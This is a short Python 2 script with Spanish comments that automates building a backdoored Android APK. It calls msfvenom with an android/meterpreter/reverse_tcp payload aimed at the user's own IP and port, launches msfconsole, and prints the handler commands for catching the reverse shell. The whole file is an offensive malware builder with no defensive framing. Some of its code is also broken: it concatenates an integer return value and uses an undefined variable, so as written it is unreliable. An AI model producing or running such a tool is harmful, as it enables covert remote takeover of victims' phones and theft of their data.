import socket
import os
import argparse
from subprocess import Popen, PIPE, STDOUT

class createAPK:
    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    
    def launchProcess(self,command):
        p = Popen(command, stdout = PIPE, 
            stderr = STDOUT, shell = True)
        for line in p.stdout:
            print line.replace('\n', '')
        return 0
    
    def create(self, app_name, lp):
        
        ipl = self.get_ip_address()
        print ipl
        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
        
        self.launchProcess(com)
        
        return ipl
        
##PARSER SHIT
parser = argparse.ArgumentParser(description='Testing')
        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                            #help='ip remota')
parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                    help='nombre de la app')
parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                    help='local port')
args = parser.parse_args()
##//PARSER SHIT---------

print "Generando APK..."
APK = createAPK()
print "Iniciando postgresql..."
ipl = APK.launchProcess("gnome-terminal -e 'bash -c \"service postgresql start; exec bash\"'")
print "Iniciando msfconsole en nueva ventana..."
APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
print "--usa esta guia--"
print "use exploit/multi/handler"
print "set payload android/meterpreter/reverse_tcp"
print "set LHOST " + ipl
print "set LPORT "+ lp
print "exploit"
APK.create(args.app_name, args.lp)

raw_input("Presiona una tecla cuando hayas configurado el handler...")